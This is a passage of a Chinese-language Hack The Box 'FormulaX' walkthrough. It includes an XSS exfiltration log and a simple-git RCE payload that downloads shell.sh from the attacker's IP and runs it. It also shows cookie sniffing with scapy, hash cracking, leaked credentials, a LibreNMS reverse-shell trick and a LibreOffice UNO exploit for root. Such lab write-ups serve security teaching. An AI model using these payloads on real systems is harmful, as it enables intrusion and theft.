document.body.appendChild(scriptEle);&#x27;&gt;&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>啓動 http 服務器，發送 xss payload， 就會收到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">10.129.230.190 - - [10/Mar/2024 04:19:39] &quot;OPTIONS /?=Greetings!. How can i help you today ?. You can type help to see some buildin commands HTTP/1.1&quot; 501 -</span><br><span class="line">10.129.230.190 - - [10/Mar/2024 04:19:40] code 501, message Unsupported method (&#x27;OPTIONS&#x27;)</span><br><span class="line">10.129.230.190 - - [10/Mar/2024 04:19:40] &quot;OPTIONS /?=Hello, I am Admin.Testing the Chat Application HTTP/1.1&quot; 501 -</span><br><span class="line">10.129.230.190 - - [10/Mar/2024 04:19:40] code 501, message Unsupported method (&#x27;OPTIONS&#x27;)</span><br><span class="line">10.129.230.190 - - [10/Mar/2024 04:19:40] &quot;OPTIONS /?=Write a script for  dev-git-auto-update.chatbot.htb to work properly HTTP/1.1&quot; 501 -</span><br><span class="line">10.129.230.190 - - [10/Mar/2024 04:19:40] code 501, message Unsupported method (&#x27;OPTIONS&#x27;)</span><br><span class="line">10.129.230.190 - - [10/Mar/2024 04:19:40] &quot;OPTIONS /?=Message Sent:&lt;br&gt;history HTTP/1.1&quot; 501 -</span><br><span class="line">10.129.230.190 - - [10/Mar/2024 04:19:40] code 501, message Unsupported method (&#x27;OPTIONS&#x27;)</span><br><span class="line">10.129.230.190 - - [10/Mar/2024 04:19:40] &quot;OPTIONS /?=Write a script to automate the auto-update HTTP/1.1&quot; 501 -</span><br><span class="line">10.129.230.190 - - [10/Mar/2024 04:19:43] &quot;GET /payload.js HTTP/1.1&quot; 200 -</span><br><span class="line">10.129.230.190 - - [10/Mar/2024 04:19:43] code 501, message Unsupported method (&#x27;OPTIONS&#x27;)</span><br><span class="line">10.129.230.190 - - [10/Mar/2024 04:19:43] &quot;OPTIONS /?=Greetings!. How can i help you today ?. You can type help to see some buildin commands HTTP/1.1&quot; 501 -</span><br><span class="line">10.129.230.190 - - [10/Mar/2024 04:19:44] code 501, message Unsupported method (&#x27;OPTIONS&#x27;)</span><br><span class="line">10.129.230.190 - - [10/Mar/2024 04:19:44] &quot;OPTIONS /?=Hello, I am Admin.Testing the Chat Application HTTP/1.1&quot; 501 -</span><br><span class="line">10.129.230.190 - - [10/Mar/2024 04:19:44] code 501, message Unsupported method (&#x27;OPTIONS&#x27;)</span><br><span class="line">10.129.230.190 - - [10/Mar/2024 04:19:44] &quot;OPTIONS /?=Write a script for  dev-git-auto-update.chatbot.htb to work properly HTTP/1.1&quot; 501 -</span><br><span class="line">10.129.230.190 - - [10/Mar/2024 04:19:44] code 501, message Unsupported method (&#x27;OPTIONS&#x27;)</span><br><span class="line">10.129.230.190 - - [10/Mar/2024 04:19:44] &quot;OPTIONS /?=Write a script to automate the auto-update HTTP/1.1&quot; 501 -</span><br><span class="line">10.129.230.190 - - [10/Mar/2024 04:19:44] code 501, message Unsupported method (&#x27;OPTIONS&#x27;)</span><br><span class="line">10.129.230.190 - - [10/Mar/2024 04:19:44] &quot;OPTIONS /?=Message Sent:&lt;br&gt;history HTTP/1.1&quot; 501 -</span><br></pre></td></tr></table></figure>
+
+<p>整理了下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Hello, I am Admin.Testing the Chat Application</span><br><span class="line">Write a script for  dev-git-auto-update.chatbot.htb to work properly</span><br><span class="line">Message Sent:&lt;br&gt;history</span><br><span class="line">Greetings!. How can i help you today ?. You can type help to see some buildin commands</span><br></pre></td></tr></table></figure>
+
+<p>得到一個子域名：<code>dev-git-auto-update.chatbot.htb</code>​。</p>
+<h2 id="0x3-webshell-in-the-box"><a href="#0x3-webshell-in-the-box" class="headerlink" title="0x3 webshell in the box"></a>0x3 webshell in the box</h2><p>打開後：</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/11-FormulaX-51ju23JHNISDg/image-20240310042349-cdj76m6.png" alt="image">​</p>
+<p>右下角有 <code>simple-git v3.14</code>​，搜索：<code>simple git v3.14 exploit rce</code>​ 看到</p>
+<blockquote>
+<p>Affected versions of this package are vulnerable to Remote Code Execution (RCE) via the <code>clone()</code>​, <code>pull()</code>​, <code>push()</code>​ and <code>listRemote()</code>​ methods, due to improper input sanitization. This vulnerability exists due to an incomplete fix of <a target="_blank" rel="noopener" href="https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-3112221">CVE-2022-25912</a>.</p>
+<p><a target="_blank" rel="noopener" href="https://security.snyk.io/package/npm/simple-git/3.14.0">https://security.snyk.io/package/npm/simple-git/3.14.0</a></p>
+</blockquote>
+<p>也就是説 <code>simple-git</code>​ 是nodejs的模塊，關於調用也是運行内部的命令，比如  <code>git clone xxx</code>​ 什麽的。</p>
+<p>來到這篇：</p>
+<blockquote>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> simpleGit = <span class="built_in">require</span>(<span class="string">&#x27;simple-git&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> git2 = <span class="title function_">simpleGit</span>()</span><br><span class="line">git2.<span class="title function_">clone</span>(<span class="string">&#x27;ext::sh -c touch% /tmp/pwn% &gt;&amp;2&#x27;</span>, <span class="string">&#x27;/tmp/example-new-repo&#x27;</span>, [<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;protocol.ext.allow=always&quot;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-3112221">https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-3112221</a></p>
+</blockquote>
+<p>可以看到第一個是可以控制的，所以嘗試：<code>ext::sh -c curl% 10.10.16.21</code>​ 得到請求，所以在這裏可以獲得webshell。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">ext</span>::sh -c wget% <span class="number">10.10</span><span class="number">.16</span><span class="number">.21</span>/shell.<span class="property">sh</span>% -O% <span class="regexp">/tmp/</span>shell.<span class="property">sh</span></span><br><span class="line"><span class="attr">ext</span>::sh -c bash% <span class="regexp">/tmp/</span>shell.<span class="property">sh</span></span><br></pre></td></tr></table></figure>
+
+<p>跑了下Linpeas，發現了一些神奇的地方：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">???????????? <span class="title class_">Active</span> <span class="title class_">Ports</span>                                                                                                                                                                </span><br><span class="line">? <span class="attr">https</span>:<span class="comment">//book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                                              </span></span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">3306</span>          <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               <span class="variable constant_">LISTEN</span>      -                                                                                                        </span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.53</span>:<span class="number">53</span>           <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               <span class="variable constant_">LISTEN</span>      -                                                                                                        </span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8082</span>          <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               <span class="variable constant_">LISTEN</span>      <span class="number">1196</span>/node /<span class="keyword">var</span>/www/                                                                                      </span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8081</span>          <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               <span class="variable constant_">LISTEN</span>      <span class="number">1198</span>/node /<span class="keyword">var</span>/www/                                                                                      </span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8000</span>          <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               <span class="variable constant_">LISTEN</span>      -                                                                                                        </span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">80</span>              <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               <span class="variable constant_">LISTEN</span>      <span class="number">961</span>/<span class="attr">nginx</span>: worker p                                                                                      </span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">22</span>              <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               <span class="variable constant_">LISTEN</span>      -                                                                                                        </span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">27017</span>         <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               <span class="variable constant_">LISTEN</span>      -                                                                                                        </span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">33511</span>         <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               <span class="variable constant_">LISTEN</span>      <span class="number">1259</span>/chrome --allow                                                                                      </span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">3000</span>          <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               <span class="variable constant_">LISTEN</span>      <span class="number">961</span>/<span class="attr">nginx</span>: worker p                                                                                      </span><br><span class="line">tcp6       <span class="number">0</span>      <span class="number">0</span> :::<span class="number">22</span>                   :::*                    <span class="variable constant_">LISTEN</span>      -                                                                                                        </span><br><span class="line">                                                                                                         </span><br><span class="line">-r-xr-xr-x <span class="number">1</span> root root <span class="number">116</span> <span class="title class_">Jul</span> <span class="number">28</span>  <span class="number">2023</span> /<span class="keyword">var</span>/www/app/.<span class="property">env</span>                                                                                                                                </span><br><span class="line"><span class="variable constant_">PORT</span> = <span class="number">8082</span>                                                                                                                                                                              </span><br><span class="line"><span class="variable constant_">URL_DATABASE</span>=<span class="string">&quot;mongodb://localhost:27017&quot;</span>                                                                                                                                                 </span><br><span class="line"><span class="variable constant_">SECRET</span>=<span class="title class_">ThisIsTheN0</span>deSecret                                                                                                                                                               </span><br><span class="line"><span class="variable constant_">ADMIN_EMAIL</span>=<span class="string">&quot;admin@chatbot.htb&quot;</span>  </span><br><span class="line"></span><br><span class="line"><span class="title class_">Files</span> <span class="keyword">with</span> capabilities (limited to <span class="number">50</span>):                                                                                                                                                                                                                                                                                                          </span><br><span class="line"><span class="regexp">/usr/</span>bin/python3<span class="number">.10</span> cap_net_raw=eip </span><br><span class="line"></span><br><span class="line"><span class="title class_">Unexpected</span> <span class="keyword">in</span> /opt (usually empty)                                                                                                                                    [<span class="number">333</span>/<span class="number">2215</span>]</span><br><span class="line">total <span class="number">12</span>                                                                                                                                                                                 </span><br><span class="line">drwxr-xr-x  <span class="number">3</span> root     root     <span class="number">4096</span> <span class="title class_">Feb</span> <span class="number">16</span> <span class="number">15</span>:<span class="number">21</span> .                                                                                                                                      </span><br><span class="line">drwxr-xr-x <span class="number">19</span> root     root     <span class="number">4096</span> <span class="title class_">Feb</span> <span class="number">20</span> <span class="number">16</span>:<span class="number">16</span> ..                                                                                                                                     </span><br><span class="line">drwxrwx--x <span class="number">27</span> librenms librenms <span class="number">4096</span> <span class="title class_">Feb</span> <span class="number">19</span> <span class="number">13</span>:<span class="number">33</span> librenms</span><br></pre></td></tr></table></figure>
+
+<p>Python3 被手動加了 <code>cap_net_raw</code>​ 權限，然後有安裝mongodb。</p>
+<h2 id="0x4-user-shell-frank-dorky"><a href="#0x4-user-shell-frank-dorky" class="headerlink" title="0x4 user shell - frank_dorky"></a>0x4 user shell - frank_dorky</h2><p>隨手看下mongodb，看看有什麽東西，</p>
+<p>可以參考： <a target="_blank" rel="noopener" href="https://www.mongodb.com/developer/products/mongodb/cheat-sheet/">https://www.mongodb.com/developer/products/mongodb/cheat-sheet/</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">www-data@formulax:/opt$ mongo</span><br><span class="line">MongoDB shell version v4.4.29</span><br><span class="line">connecting to: mongodb://127.0.0.1:27017/?compressors=disabled&amp;gssapiServiceName=mongodb</span><br><span class="line">.....</span><br><span class="line"></span><br><span class="line">&gt; show dbs</span><br><span class="line">admin    0.000GB</span><br><span class="line">config   0.000GB</span><br><span class="line"><span class="built_in">local</span>    0.000GB</span><br><span class="line">testing  0.000GB</span><br><span class="line"></span><br><span class="line">&gt; use testing</span><br><span class="line">switched to db testing</span><br><span class="line"></span><br><span class="line">&gt; show collections</span><br><span class="line">messages</span><br><span class="line"><span class="built_in">users</span></span><br><span class="line"></span><br><span class="line">&gt; db.users.<span class="function"><span class="title">find</span></span>()</span><br><span class="line">&#123; <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;648874de313b8717284f457c&quot;</span>), <span class="string">&quot;name&quot;</span> : <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;email&quot;</span> : <span class="string">&quot;admin@chatbot.htb&quot;</span>, <span class="string">&quot;password&quot;</span> : <span class="string">&quot;$2b$10<span class="variable">$VSrvhM</span>/5YGM0uyCeEYf/TuvJzzTz.jDLVJ2QqtumdDoKGSa.6aIC.&quot;</span>, <span class="string">&quot;terms&quot;</span> : <span class="literal">true</span>, <span class="string">&quot;value&quot;</span> : <span class="literal">true</span>, <span class="string">&quot;authorization_token&quot;</span> : <span class="string">&quot;Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySUQiOiI2NDg4NzRkZTMxM2I4NzE3Mjg0ZjQ1N2MiLCJpYXQiOjE3MTAwODcwNjB9.7y0RBqK9hp-16ekHhiI7sD2AoUqR13POn7hii3ApcI4&quot;</span>, <span class="string">&quot;__v&quot;</span> : 0 &#125;</span><br><span class="line">&#123; <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;648874de313b8717284f457d&quot;</span>), <span class="string">&quot;name&quot;</span> : <span class="string">&quot;frank_dorky&quot;</span>, <span class="string">&quot;email&quot;</span> : <span class="string">&quot;frank_dorky@chatbot.htb&quot;</span>, <span class="string">&quot;password&quot;</span> : <span class="string">&quot;$2b$10<span class="variable">$hrB</span>/by.tb/4ABJbbt1l4/ep/L4CTY6391eSETamjLp7s.elpsB4J6&quot;</span>, <span class="string">&quot;terms&quot;</span> : <span class="literal">true</span>, <span class="string">&quot;value&quot;</span> : <span class="literal">true</span>, <span class="string">&quot;authorization_token&quot;</span> : <span class="string">&quot; &quot;</span>, <span class="string">&quot;__v&quot;</span> : 0 &#125;</span><br></pre></td></tr></table></figure>
+
+<p>得到兩個hash，拿去hashcat 爆破，得到：<code>frank_dorky</code>​ 用戶的密碼：<code>manchesterunited</code>​，ssh 得到 user.txt 。</p>
+<p>​<code>frank_dorky</code>​ 用戶好像沒什麽好看的地方，看到端口 3000 和 8000 開放著，轉發到本地看看。</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/11-FormulaX-51ju23JHNISDg/image-20240310044400-tykg40q.png" alt="image">​</p>
+<h2 id="0x5-python-with-scapy"><a href="#0x5-python-with-scapy" class="headerlink" title="0x5 python with scapy"></a>0x5 python with scapy</h2><p>由於python不知道爲什麽會故意設置  <code>cap_net_raw=eip</code>​，也就是可以用python來進行抓包，</p>
+<p>這個時候會有個想法，會不會有用戶存取3000端口？這樣我就可以抓他的cookie了。</p>
+<p>在谷歌尋找如何使用scapy來抓包之後，居然發現機器有安裝scapy。</p>
+<p>使用這篇文章進行抓包： <a target="_blank" rel="noopener" href="https://www.geeksforgeeks.org/packet-sniffing-using-scapy/">https://www.geeksforgeeks.org/packet-sniffing-using-scapy/</a></p>
+<p>由於我只需要 3000 的端口，所以進行過濾：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">frank_dorky@formulax:~$ scapy</span><br><span class="line">INFO: Can<span class="string">&#x27;t import PyX. Won&#x27;</span>t be able to use psdump() or pdfdump().</span><br><span class="line">WARNING: IPython not available. Using standard Python shell instead.</span><br><span class="line">AutoCompletion, History are disabled.</span><br><span class="line">                                  </span><br><span class="line">                     aSPY//YASa   </span><br><span class="line">             apyyyyCY//////////YCa       |</span><br><span class="line">            sY//////YSpcs  scpCY//Pp     | Welcome to Scapy</span><br><span class="line"> ayp ayyyyyyySCP//Pp           syY//C    | Version 2.5.0</span><br><span class="line"> AYAsAYYYYYYYY///Ps              cY//S   |</span><br><span class="line">         pCCCCY//p          cSSps y//Y   | https://github.com/secdev/scapy</span><br><span class="line">         SPPPP///a          pP///AC//Y   |</span><br><span class="line">              A//A            cyP////C   | Have fun!</span><br><span class="line">              p///Ac            sC///a   |</span><br><span class="line">              P////YCpc           A//A   | We are <span class="keyword">in</span> France, we say Skappee.</span><br><span class="line">       scccccp///pSP///p          p//Y   | OK? Merci.</span><br><span class="line">      sY/////////y  caa           S//P   |             -- Sebastien Chabal</span><br><span class="line">       cayCyayP//Ya              pY/Ya   |</span><br><span class="line">        sY/PsY////YCc          aC//Yp </span><br><span class="line">         sc  sccaCY//PCypaapyCP//YSs  </span><br><span class="line">                  spCPY//////YPSps  </span><br><span class="line">                       ccaacs     </span><br><span class="line">                                  </span><br><span class="line">&gt;&gt;&gt; capture = sniff(iface=<span class="string">&quot;lo&quot;</span>, filter=<span class="string">&quot;tcp and port 3000&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>輸入完之後并不會有反應，因爲已經在抓包了，所以先等一段時間，泡杯茶然後按下 <code>Ctrl + C</code>​ 就可以停止抓包了，然後輸入下面的命令保存，并且傳到本地的電腦。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; wrpcap(<span class="string">&quot;mane.pcap&quot;</span>, capture)</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/11-FormulaX-51ju23JHNISDg/image-20240311003306-g5hdelx.png" alt="image">​</p>
+<p>得到cookie:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: XSRF-TOKEN=eyJpdiI6ImduZEF3TEtBYXNCY0ZFSFpHcVdpWkE9PSIsInZhbHVlIjoiYnBDZjVSb2pBYTlOSkhhSGNuN2FhT3dtRDJNUXZTNis5OVUwSzNqS2FCNFo5cFBlYXg4dmRXWnRrRlRsVzUxb2pQVXI3UFVEcnB4b21GbEFTRmVIL1NqZ3R3elJCZnZYaGsxK0tuU1FFeW5udnMxY0dhdzhqb1JwTkFCRlQ2NCsiLCJtYWMiOiIwNDBjNzE2YmYyM2U5NjU1MWZlZmUxNzgzNzFkNTIzNWZkYzY0NzEyNzg2OGU5YjBhMWQ5MjRjYTRlNjhhZDUyIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6InFzaG5WbWJ2RmcyOXpMU2JoNlB2Vmc9PSIsInZhbHVlIjoiOTJUWk1NRGJkcFZrMEhjTVM3OEp4OG5GVVBpQnVTL0p5M0Q1L0hPUVBRUXBqNXgyZldWamtnY21MTG9HMTA3TlV3N1g3SW45T3RoZmdic2RnZmF4aW5ob3V1RHlnNkFpa2VCNjI5MTVmVmtJRnFnUU1qaHM0UWVDYjlqbnpUL0wiLCJtYWMiOiIwM2NjYTRjMjIwNmE0ZDQ0NmNhY2E5NjBlYmYxMTI0MzVkY2U5ODVlZjE3YTQwODY5NjBlODEzZDU1OTdmYjQwIiwidGFnIjoiIn0%3D</span><br></pre></td></tr></table></figure>
+
+<p>導入到瀏覽器看看是否有效，</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/11-FormulaX-51ju23JHNISDg/image-20240311003518-mj4dkhk.png" alt="image">​</p>
+<p>可以看到是有效的。</p>
+<h2 id="0xFF-非預期得到-LibreNMS-admin"><a href="#0xFF-非預期得到-LibreNMS-admin" class="headerlink" title="0xFF 非預期得到 LibreNMS admin"></a>0xFF 非預期得到 LibreNMS admin</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">frank_dorky@formulax:/opt$ <span class="built_in">cd</span> librenms/</span><br><span class="line"></span><br><span class="line">frank_dorky@formulax:/opt/librenms$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span>: cannot open directory <span class="string">&#x27;.&#x27;</span>: Permission denied</span><br><span class="line"></span><br><span class="line">frank_dorky@formulax:/opt/librenms$ php ./adduser.php</span><br><span class="line">Add User Tool</span><br><span class="line">Usage: ./adduser.php &lt;username&gt; &lt;password&gt; &lt;level 1-10&gt; [email]</span><br><span class="line"></span><br><span class="line">frank_dorky@formulax:/opt/librenms$ php ./adduser.php mane manemane 10 mane@manesec.com</span><br><span class="line"></span><br><span class="line">User mane added successfully</span><br></pre></td></tr></table></figure>
+
+<p>去 3000 端口登錄之後就有管理員權限，就可以跳過  0x5 python with scapy。</p>
+<h2 id="0x6-3000-LibreNMS"><a href="#0x6-3000-LibreNMS" class="headerlink" title="0x6 3000 - LibreNMS"></a>0x6 3000 - LibreNMS</h2><p>裏面什麽也沒有，不過有趣的是 <code>http://127.0.0.1:3000/settings/external/binaries</code>​ 可以自定義運行的程序，寫個reverse shell 放在  <code>/tmp/shell</code>​ 然後 <code>chmod +x /tmp/shell</code>​，之後把所有的路徑都換成 <code>/tmp/shell</code>​ ，</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/11-FormulaX-51ju23JHNISDg/image-20240311010120-66zus0u.png" alt="image">​</p>
+<p>還完后，點擊 <code>Devices -&gt; Add Devices</code>​ 就可以觸發 reverse shell。</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/11-FormulaX-51ju23JHNISDg/image-20240311010209-qlpvzgk.png" alt="image">​</p>
+<p>由於另一個用戶還沒出現，所以找了一下裏面的文件，找到：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">librenms@formulax:~$ <span class="built_in">cat</span> /opt/librenms/.custom.env </span><br><span class="line">APP_KEY=<span class="built_in">base64</span>:jRoDTOFGZEO08+68w7EzYPp8a7KZCNk+4Fhh97lnCEk=</span><br><span class="line"></span><br><span class="line">DB_HOST=localhost</span><br><span class="line">DB_DATABASE=librenms</span><br><span class="line">DB_USERNAME=kai_relay</span><br><span class="line">DB_PASSWORD=mychemicalformulaX</span><br><span class="line"></span><br><span class="line"><span class="comment">#APP_URL=</span></span><br><span class="line">NODE_ID=648b260eb18d2</span><br><span class="line">VAPID_PUBLIC_KEY=BDhe6thQfwA7elEUvyMPh9CEtrWZM1ySaMMIaB10DsIhGeQ8Iks8kL6uLtjMsHe61-ZCC6f6XgPVt7O6liSqpvg</span><br><span class="line">VAPID_PRIVATE_KEY=chr9zlPVQT8NsYgDGeVFda-AiD0UWIY6OW-jStiwmTQ</span><br></pre></td></tr></table></figure>
+
+<p>然後得到 <code>kai_relay</code>​ 用戶的密碼 <code>mychemicalformulaX</code>​。</p>
+<h2 id="0x7-user-shell-kai-relay-to-root"><a href="#0x7-user-shell-kai-relay-to-root" class="headerlink" title="0x7 user shell - kai_relay to root"></a>0x7 user shell - kai_relay to root</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kai_relay@formulax:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> kai_relay on forumlax:</span><br><span class="line">    env_reset, timestamp_timeout=0, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_reset, timestamp_timeout=0</span><br><span class="line"></span><br><span class="line">User kai_relay may run the following commands on forumlax:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/office.sh</span><br><span class="line"></span><br><span class="line">kai_relay@formulax:~$ <span class="built_in">cat</span> /usr/bin/office.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">/usr/bin/soffice --calc --accept=<span class="string">&quot;socket,host=localhost,port=2002;urp;&quot;</span> --norestore --nologo --nodefault --headless</span><br></pre></td></tr></table></figure>
+
+<p>看起來可以用root權限開啓office的服務。</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/11-FormulaX-51ju23JHNISDg/image-20240311011004-0936e6t.png" alt="image">​</p>
+<p>使用 <code>kali_relay</code>​ 登陸進去之後，看到 </p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/11-FormulaX-51ju23JHNISDg/image-20240311011138-7lwmxgf.png" alt="image">​</p>
+<p>這裏應該是提示，叫我們嘗試使用 <code>unoctl,pyUNO,pyoo &amp; pyLibreOffice</code>​ 去嘗試交互。</p>
+<p>所以網上搜索，找到：</p>
+<p><a target="_blank" rel="noopener" href="https://byurinov.github.io/LibreOffice-RCE/">https://byurinov.github.io/LibreOffice-RCE/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/46544">https://www.exploit-db.com/exploits/46544</a></p>
+<p>根據提示，轉發2002端口到本地之後，在機器上新建一個 <code>/tmp.shell.sh</code>​，運行就得到shell啦。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> exp.py  </span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line">import uno</span><br><span class="line">from com.sun.star.beans import PropertyValue</span><br><span class="line"></span><br><span class="line"><span class="built_in">local</span> = uno.getComponentContext()</span><br><span class="line">resolver = local.ServiceManager.createInstanceWithContext(<span class="string">&quot;com.sun.star.bridge.UnoUrlResolver&quot;</span>, <span class="built_in">local</span>)</span><br><span class="line">context = resolver.resolve(<span class="string">&quot;uno:socket,host=10.10.16.21,port=2002;urp;StarOffice.ComponentContext&quot;</span>)</span><br><span class="line">rc = context.ServiceManager.createInstanceWithContext(<span class="string">&quot;com.sun.star.system.SystemShellExecute&quot;</span>, context)</span><br><span class="line">rc.execute(<span 